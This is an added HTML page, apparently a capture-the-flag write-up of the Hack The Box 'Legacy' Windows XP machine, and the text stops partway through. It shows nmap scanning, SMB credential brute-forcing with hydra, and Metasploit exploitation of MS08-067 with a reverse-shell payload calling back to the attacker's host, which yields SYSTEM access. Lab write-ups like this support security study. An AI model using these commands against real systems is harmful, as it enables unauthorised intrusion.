@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+        <meta name="author" content="Matthieu Mezirard">
+    
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta name="description" content="This is an easy Windows box.">
+    
+    <title>
+        
+            
+        
+        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;legacy#
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Legacy<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2023-11-12</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/legacy/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#host-10-10-10-4">Host 10.10.10.4</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#scanning">Scanning</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#ports">Ports</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#fingerprinting">Fingerprinting</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#scripts">Scripts</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#services-enumeration">Services enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#smb">SMB</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#foothold-ms08-067">Foothold (MS08-067)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#preparation">Preparation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#exploitation">Exploitation</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#getting-a-lay-of-the-land">Getting a lay of the land</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#architecture">Architecture</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#version">Version</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#hotfixes">Hotfixes</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#users">Users</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#groups">Groups</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#nics">NICs</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#system-enumeration">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#flags">Flags</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                        </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/legacy/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Windows</p>
+<p><strong>Release date</strong>: 2017-03-15</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/1">ch4p</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
+practice security-wise, but it's a VM so it's alright. This way I won't have to
+prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting
+with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box.
+I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
+<code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
+<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
+<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
+files in this folder available over the Internet, which will be especially
+useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
+This will come in handy once we get a foothold, for privilege escalation and
+for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the
+complexity of some exploits, and prefer a more manual approach when it's not too
+much hassle. This way, I'll have a better understanding of the exploits I'm
+running, and I'll have more control over what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.4</code>. The
+commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
+need to transfer files or binaries to the target machine, I'll always place them
+in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="host-10-10-10-4">Host <code>10.10.10.4</code></h1>
+<h2 id="scanning">Scanning</h2>
+<h3 id="ports">Ports</h3>
+<p>As usual, let's start by initiating a port scan on Legacy using a TCP SYN <code>nmap</code>
+scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.4<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT    STATE SERVICE
+</span><span class="z-text z-plain">135/tcp open  msrpc
+</span><span class="z-text z-plain">139/tcp open  netbios-ssn
+</span><span class="z-text z-plain">445/tcp open  microsoft-ds
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also check the 500 most common UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.4<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE         SERVICE
+</span><span class="z-text z-plain">123/udp  open          ntp
+</span><span class="z-text z-plain">137/udp  open          netbios-ns
+</span><span class="z-text z-plain">138/udp  open|filtered netbios-dgm
+</span><span class="z-text z-plain">445/udp  open|filtered microsoft-ds
+</span><span class="z-text z-plain">500/udp  open|filtered isakmp
+</span><span class="z-text z-plain">1025/udp open|filtered blackjack
+</span><span class="z-text z-plain">1900/udp open|filtered upnp
+</span><span class="z-text z-plain">4500/udp open|filtered nat-t-ike
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h3 id="fingerprinting">Fingerprinting</h3>
+<p>Following the ports scans, let's gather more data about the services associated
+with the open TCP ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.4<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>135,139,445<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT    STATE SERVICE      VERSION
+</span><span class="z-text z-plain">135/tcp open  msrpc        Microsoft Windows RPC
+</span><span class="z-text z-plain">139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+</span><span class="z-text z-plain">445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
+</span><span class="z-text z-plain">Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's do the same for the UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.4<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>123,137,138,445,500,1025,1900,4500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE         SERVICE      VERSION
+</span><span class="z-text z-plain">123/udp  open          ntp          Microsoft NTP
+</span><span class="z-text z-plain">137/udp  open          netbios-ns   Microsoft Windows netbios-ns (workgroup: HTB)
+</span><span class="z-text z-plain">138/udp  open|filtered netbios-dgm
+</span><span class="z-text z-plain">445/udp  open|filtered microsoft-ds
+</span><span class="z-text z-plain">500/udp  open|filtered isakmp
+</span><span class="z-text z-plain">1025/udp open|filtered blackjack
+</span><span class="z-text z-plain">1900/udp open|filtered upnp
+</span><span class="z-text z-plain">4500/udp open|filtered nat-t-ike
+</span><span class="z-text z-plain">Service Info: Host: LEGACY; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> managed to determine that Legacy is running Windows XP, and
+that its hostname is <code>LEGACY</code>.</p>
+<h3 id="scripts">Scripts</h3>
+<p>Let's run <code>nmap</code>'s default scripts on the TCP services to see if they can find
+additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.4<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>135,139,445<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT    STATE SERVICE
+</span><span class="z-text z-plain">135/tcp open  msrpc
+</span><span class="z-text z-plain">139/tcp open  netbios-ssn
+</span><span class="z-text z-plain">445/tcp open  microsoft-ds
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Host script results:
+</span><span class="z-text z-plain">| smb-security-mode: 
+</span><span class="z-text z-plain">|   account_used: guest
+</span><span class="z-text z-plain">|   authentication_level: user
+</span><span class="z-text z-plain">|   challenge_response: supported
+</span><span class="z-text z-plain">|_  message_signing: disabled (dangerous, but default)
+</span><span class="z-text z-plain">|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:5b:bd (VMware)
+</span><span class="z-text z-plain">|_clock-skew: mean: 5d00h57m39s, deviation: 1h24m50s, median: 4d23h57m39s
+</span><span class="z-text z-plain">| smb-os-discovery: 
+</span><span class="z-text z-plain">|   OS: Windows XP (Windows 2000 LAN Manager)
+</span><span class="z-text z-plain">|   OS CPE: cpe:/o:microsoft:windows_xp::-
+</span><span class="z-text z-plain">|   Computer name: legacy
+</span><span class="z-text z-plain">|   NetBIOS computer name: LEGACY\x00
+</span><span class="z-text z-plain">|   Workgroup: HTB\x00
+</span><span class="z-text z-plain">|_  System time: 2024-02-08T00:06:04+02:00
+</span><span class="z-text z-plain">|_smb2-time: Protocol negotiation failed (SMB2)
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also run them on the UDP services.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.4<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>123,137,138,445,500,1025,1900,4500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE         SERVICE
+</span><span class="z-text z-plain">123/udp  open          ntp
+</span><span class="z-text z-plain">| ntp-info: 
+</span><span class="z-text z-plain">|_  
+</span><span class="z-text z-plain">137/udp  open          netbios-ns
+</span><span class="z-text z-plain">| nbns-interfaces: 
+</span><span class="z-text z-plain">|   hostname: LEGACY
+</span><span class="z-text z-plain">|   interfaces: 
+</span><span class="z-text z-plain">|_    10.10.10.4
+</span><span class="z-text z-plain">138/udp  open|filtered netbios-dgm
+</span><span class="z-text z-plain">445/udp  open|filtered microsoft-ds
+</span><span class="z-text z-plain">500/udp  open|filtered isakmp
+</span><span class="z-text z-plain">1025/udp open|filtered blackjack
+</span><span class="z-text z-plain">1900/udp open|filtered upnp
+</span><span class="z-text z-plain">4500/udp open|filtered nat-t-ike
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Host script results:
+</span><span class="z-text z-plain">|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:5b:bd (VMware)
+</span><span class="z-text z-plain">|_clock-skew: 5d01h57m50s
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="services-enumeration">Services enumeration</h2>
+<h3 id="smb">SMB</h3>
+<h4 id="exploring-the-shares">Exploring the shares</h4>
+<p>Let's try to list the SMB shares with a NULL session, since we have no
+credentials at our disposal.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> smbclient<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>L</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>//10.10.10.4<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>N</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">session setup failed: NT_STATUS_INVALID_PARAMETER
+</span></code></pre>
+<p>It failed.</p>
+<p>Let's try common credentials then.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> hydra<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>L</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>P</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/share/wordlists/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.4<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>smb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">1 of 1 target completed, 0 valid password found
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>It failed too.</p>
+<h4 id="known-vulnerabilities">Known vulnerabilities</h4>
+<p>We don't know the credentials to connect to the SMB server. But maybe it's
+vulnerable to known exploits?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.4<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>445<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>script</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>vuln<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT    STATE SERVICE
+</span><span class="z-text z-plain">445/tcp open  microsoft-ds
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Host script results:
+</span><span class="z-text z-plain">| smb-vuln-ms08-067: 
+</span><span class="z-text z-plain">|   VULNERABLE:
+</span><span class="z-text z-plain">|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
+</span><span class="z-text z-plain">|     State: VULNERABLE
+</span><span class="z-text z-plain">|     IDs:  CVE:CVE-2008-4250
+</span><span class="z-text z-plain">|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
+</span><span class="z-text z-plain">|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
+</span><span class="z-text z-plain">|           code via a crafted RPC request that triggers the overflow during path canonicalization.
+</span><span class="z-text z-plain">|           
+</span><span class="z-text z-plain">|     Disclosure date: 2008-10-23
+</span><span class="z-text z-plain">|     References:
+</span><span class="z-text z-plain">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
+</span><span class="z-text z-plain">|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+</span><span class="z-text z-plain">| smb-vuln-ms17-010: 
+</span><span class="z-text z-plain">|   VULNERABLE:
+</span><span class="z-text z-plain">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+</span><span class="z-text z-plain">|     State: VULNERABLE
+</span><span class="z-text z-plain">|     IDs:  CVE:CVE-2017-0143
+</span><span class="z-text z-plain">|     Risk factor: HIGH
+</span><span class="z-text z-plain">|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+</span><span class="z-text z-plain">|        servers (ms17-010).
+</span><span class="z-text z-plain">|           
+</span><span class="z-text z-plain">|     Disclosure date: 2017-03-14
+</span><span class="z-text z-plain">|     References:
+</span><span class="z-text z-plain">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+</span><span class="z-text z-plain">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+</span><span class="z-text z-plain">|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+</span><span class="z-text z-plain">|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
+</span><span class="z-text z-plain">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+</span><span class="z-text z-plain">|_smb-vuln-ms10-054: false
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>According to the <code>smb-vuln-ms08-067</code> and <code>smb-vuln-ms17-010</code> scripts, Legacy
+should be vulnerable to both
+<a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067">MS08-067</a>
+and
+<a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010">MS17-010</a>.</p>
+<h2 id="foothold-ms08-067">Foothold (<a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067">MS08-067</a>)</h2>
+<p><a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067">MS08-067</a>
+is a buffer overflow vulnerability in the Windows Server service, more
+specifically a flaw in the path canonicalization code of <code>NetAPI32.dll</code>. The
+Windows Server service is responsible for handling file and print sharing on
+Windows systems, and allowing communication between network devices. By sending
+a specific RPC request to the target system, an attacker can get RCE.</p>
+<h3 id="preparation">Preparation</h3>
+<p>I'll use the Metasploit module <code>exploit/windows/smb/ms08_067_netapi</code> to
+exploit this vulnerability, since it's non-trivial to do by hand.</p>
+<p>I'll set the <code>payload</code> to
+<code>payload/windows/shell_reverse_tcp</code>, the <code>RHOSTS</code> to <code>10.10.10.4</code>, the
+<code>LHOST</code> to <code>10.10.14.4</code> and the <code>LPORT</code> to <code>9001</code>.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>No we can launch the exploit!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">msf6</span></span><span class="z-meta z-function-call z-arguments z-shell"> exploit(windows/smb/ms08_067_netapi</span><span class="z-meta z-function-call z-shell"></span>) <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> run
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">C:\WINDOWS\system32&gt;
+</span></code></pre>
+<p>It went off without a hitch.</p>
+<p>However, I don't like Metasploit's shell, so I'll open my own on port <code>9002</code>.
+Unfortunately, Powershell doesn't exist on this box.</p>
+<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
+<p>If we try to run <code>whoami</code>, we see that the command doesn't exist. However, we
+can easily circumvent this problem by transferring <code>whoami.exe</code> to Legacy.</p>
+<p>If we execute this binary, we discover that we got a foothold as
+<code>NT AUTHORITY\SYSTEM</code>.</p>
+<p>I could just retrieve the flags and call it a day, but for good measure I'll
+still enumerate basic information.</p>
+<h3 id="architecture">Architecture</h3>
+<p>What is Legacy's architecture?</p>
+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">C:\WINDOWS\system32<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">reg</span> <span class="z-keyword z-command z-dosbatch">query</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span> /v PROCESSOR_ARCHITECTURE
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
+</span><span class="z-text z-plain">    PROCESSOR_ARCHITECTURE      REG_SZ  x86
+</span></code></pre>
+<p>It's using x86. Let's keep that in mind to select the appropriate binaries.</p>
+<h3 id="version">Version</h3>
+<p>Let's gather some information about the Windows version of Legacy.</p>
